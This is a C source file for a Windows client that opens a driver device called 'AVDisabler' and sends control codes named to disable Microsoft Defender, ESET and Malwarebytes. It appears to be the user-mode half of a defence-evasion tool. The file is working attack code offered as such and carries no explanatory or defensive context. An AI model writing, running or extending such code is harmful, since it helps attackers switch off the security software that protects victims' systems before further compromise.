#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

#define DeviceSymlink LR"(\\.\AVDisabler)"
#define DeviceType 0x8001
#define PROCESS_TERMINATE 1

#define IOCTL_DISABLE_DEFENDER CTL_CODE(DeviceType, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)		
#define IOCTL_DISABLE_ESET CTL_CODE(DeviceType, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)			
#define IOCTL_DISABLE_MALWAREBYTES CTL_CODE(DeviceType, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)	

int main()
{
    HANDLE hDevice = CreateFile(DeviceSymlink, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Handle to the device couldn't be created: %u\n", GetLastError());
        return -1;
    }

    PVOID InputBuffer = VirtualAlloc(nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    PVOID OutputBuffer = VirtualAlloc(nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    DWORD BytesReturned = 0;
    printf("SizeOf inputbuffer: 0x%x\n", sizeof(InputBuffer));
    if (!DeviceIoControl(hDevice, IOCTL_DISABLE_DEFENDER, InputBuffer, 0x1000, OutputBuffer, 0x1000, &BytesReturned, nullptr))
    {
        printf("[-] IOCTL_DISABLE_DEFENDER (0x%x) failed with GetLastError() of: %u\n", IOCTL_DISABLE_DEFENDER, GetLastError());
        return -1;
    }
    printf("[+] IOCTL_DISABLE_DEFENDER (0x%x) executed successfully!\n", IOCTL_DISABLE_DEFENDER);

    if (*(BYTE*)OutputBuffer != 0x00) 
        printf("[*] IOCTL_DISABLE_DEFENDER Output buffer: %s\n", (CHAR*)OutputBuffer);

    getchar();

    VirtualFree(InputBuffer, 0x1000, MEM_RELEASE);
    VirtualFree(OutputBuffer, 0x1000, MEM_RELEASE);

	return 0;
}
